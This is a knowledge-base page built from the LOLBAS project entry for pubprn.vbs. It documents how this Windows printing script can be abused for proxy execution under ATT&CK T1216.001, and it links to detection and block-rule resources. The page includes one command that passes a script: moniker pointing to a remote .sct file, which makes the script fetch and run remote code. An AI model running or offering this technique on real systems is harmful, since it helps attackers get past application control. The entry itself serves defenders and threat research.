---
title: "Pubprn.vbs"
framework: "lolbas"
generated: "true"
source_path: "yml/OSScripts/Pubprn.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml"
build_date: "2026-04-27 18:39:01"
category: "OSScripts"
aliases:
  - "Pubprn.vbs"
functions:
  - "Execute"
attack_technique_ids:
  - "T1216.001"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

# Pubprn.vbs

Proxy execution with Pubprn.vbs

## Metadata

- Category: OSScripts
- Created: 2018-05-25
- Author: Oddvar Moe
- Source Path: yml/OSScripts/Pubprn.yml

## Paths

- `C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs`
- `C:\Windows\SysWOW64\Printing_Admin_Scripts\en-US\pubprn.vbs`

## Commands

### 1. Execute

Set the 2nd variable with a Script COM moniker to perform Windows Script Host (WSH) Injection

```cmd
pubprn.vbs 127.0.0.1 script:{REMOTEURL:.sct}
```

- Use Case: Proxy execution
- Privileges: User
- Operating System: Windows 10
- ATT&CK: [[kb/attack/techniques/T1216-system_script_proxy_execution|T1216.001]]

## Detections

- BlockRule: https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules
- Sigma: https://github.com/SigmaHQ/sigma/blob/ff5102832031425f6eed011dd3a2e62653008c94/rules/windows/process_creation/proc_creation_win_lolbin_pubprn.yml

## Resources

- {'Link': 'https://enigma0x3.net/2017/08/03/wsh-injection-a-case-study/'}
- {'Link': 'https://www.slideshare.net/enigma0x3/windows-operating-system-archaeology'}
- {'Link': 'https://github.com/enigma0x3/windows-operating-system-archaeology'}

## Acknowledgements

- {'Person': 'Matt Nelson', 'Handle': '@enigma0x3'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSScripts/Pubprn.yml)
